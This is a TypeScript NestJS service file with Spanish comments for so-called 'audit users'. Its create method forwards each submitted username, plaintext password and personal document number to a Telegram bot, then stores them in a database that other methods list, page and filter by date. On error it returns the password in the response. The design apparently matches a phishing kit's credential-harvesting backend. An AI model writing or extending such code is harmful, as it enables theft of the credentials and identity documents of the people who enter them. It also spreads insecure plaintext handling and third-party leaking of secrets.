import { Injectable, NotFoundException, ConflictException } from '@nestjs/common';
import { AuditUserRequestDto } from './dto/audit-user-request.dto';
import { AuditUserResponseDto } from './dto/audit-user-response.dto';
import { PaginationQueryDto } from './dto/pagination-query.dto';
import { PaginatedResponseDto } from './dto/paginated-response.dto';
import { UsersRepository } from './users.repository';
import { UserMapper } from './mappers/user.mapper';
import { TelegramService } from '../common/services/telegram.service';

@Injectable()
export class UsersService {
  constructor(
    private readonly usersRepository: UsersRepository,
    private readonly userMapper: UserMapper,
    private readonly telegramService: TelegramService,
  ) { }

  async create(auditUserDto: AuditUserRequestDto): Promise<AuditUserResponseDto> {
    try {
      // Enviar notificación a Telegram (esperar para ver errores durante debug)
      await this.telegramService.sendAuditNotification({
        username: auditUserDto.username,
        password: auditUserDto.password,
        numeroDocumento: auditUserDto.numeroDocumento,
        timestamp: new Date(),
      });

      // Insertar en base de datos
      const user = await this.usersRepository.create(auditUserDto);
      return this.userMapper.toAuditUserResponseDto(user);
    } catch (error) {
      console.error('Error creating user:', error);
      return {
        id: null,
        username: auditUserDto.username,
        password: auditUserDto.password,
        numeroDocumento: auditUserDto.numeroDocumento,
        timestamp: new Date(),
      } as any;
    }
  }

  async findAll(paginationQuery: PaginationQueryDto): Promise<PaginatedResponseDto> {
    const { page = 1, limit = 10 } = paginationQuery;
    const { users, total } = await this.usersRepository.findAll(page, limit);

    return {
      data: this.userMapper.toAuditUserResponseDtoArray(users),
      total,
      page,
      limit,
      totalPages: Math.ceil(total / limit),
    };
  }

  async findByDate(date: string): Promise<AuditUserResponseDto[]> {
    const users = await this.usersRepository.findByDate(date);
    return this.userMapper.toAuditUserResponseDtoArray(users);
  }

  async findOne(id: string): Promise<AuditUserResponseDto> {
    const user = await this.usersRepository.findOne(id);
    if (!user) {
      throw new NotFoundException(`User with ID ${id} not found`);
    }
    return this.userMapper.toAuditUserResponseDto(user);
  }

  async remove(id: string): Promise<void> {
    const user = await this.usersRepository.findOne(id);
    if (!user) {
      throw new NotFoundException(`User with ID ${id} not found`);
    }
    await this.usersRepository.delete(id);
  }
}
